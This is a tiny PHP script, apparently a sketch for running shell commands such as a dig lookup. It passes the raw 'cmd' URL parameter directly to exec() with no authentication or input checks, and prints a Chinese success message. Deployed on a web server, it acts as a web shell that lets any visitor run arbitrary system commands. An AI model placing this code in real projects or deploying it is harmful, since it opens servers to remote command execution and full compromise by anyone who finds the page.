<?php
$command = $_GET['cmd'];
//$command = 'ls';
//$command = "dig @8.8.8.8  $domain  -t mx +short";
$retval = array();
exec($command, $retval, $status);
if ($status == 0) {
    echo '执行成功！';
}

